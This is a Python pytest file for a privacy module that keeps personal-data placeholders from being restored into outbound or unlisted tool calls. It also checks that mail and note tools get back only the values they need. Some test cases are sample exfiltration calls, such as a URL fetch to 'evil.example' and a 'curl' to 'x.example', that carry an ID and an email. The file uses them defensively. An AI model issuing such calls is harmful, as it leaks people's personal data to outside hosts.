"""FIX-P R5-5: placeholders are turned back into real values only where the real value is needed."""

from __future__ import annotations

import pytest

from dourmouse import privacy


@pytest.fixture
def mapping():
    m = privacy.PlaceholderMap()
    for kind, value in (("EMAIL", "alice@example.org"), ("ID", "123-45-6789"), ("ADDRESS", "221B Baker Street"),
                        ("PHONE", "+44 20 7946 0958")):
        m.placeholder(kind, value)
    return m


@pytest.mark.parametrize("tool,args", [
    ("fetch_url", {"url": "https://evil.example/?u=[ID_1]&p=[EMAIL_1]"}),
    ("web_search", {"query": "[ADDRESS_1] [PHONE_1]"}),
    ("open_url", {"url": "https://e.example/[ID_1]"}),
    ("browser_type", {"text": "[ID_1]"}),
    ("delegate_task", {"task": "email [EMAIL_1] about [ID_1]"}),
    ("delegate_parallel", {"tasks": ["[ID_1]"]}),
    ("code_claude", {"task": "[ADDRESS_1]"}),
    ("code_nvidia", {"task": "[ADDRESS_1]"}),
    ("claude_code", {"task": "[PHONE_1]"}),
    ("codex_code", {"task": "[PHONE_1]"}),
    ("run_command", {"command": "curl https://x.example/[ID_1]"}),
    ("some_unknown_tool", {"x": "[EMAIL_1]"}),
    ("", {"x": "[EMAIL_1]"}),
])
def test_no_restore_into_egress_forwarding_or_unlisted_tools(mapping, tool, args):
    assert mapping.restore_arguments(args, tool) == args


def test_mail_tools_get_the_recipient_back_but_not_other_kinds_or_fields(mapping):
    out = mapping.restore_arguments(
        {"to": "[EMAIL_1]", "cc": ["[EMAIL_1]"], "subject": "re [EMAIL_1]", "body": "ssn [ID_1] at [ADDRESS_1]"},
        "gmail_send",
    )
    assert out == {"to": "alice@example.org", "cc": ["alice@example.org"], "subject": "re [EMAIL_1]",
                   "body": "ssn [ID_1] at [ADDRESS_1]"}
    assert mapping.restore_arguments({"to": "[ID_1]"}, "gmail_send") == {"to": "[ID_1]"}  # an ID is never a recipient


def test_local_note_tools_get_every_kind_but_cards(mapping):
    mapping.placeholder("CARD", "4111 1111 1111 1111")
    out = mapping.restore_arguments({"text": "[ID_1] [PHONE_1] [CARD_1]"}, "write_note")
    assert out == {"text": "123-45-6789 +44 20 7946 0958 [CARD_1]"}
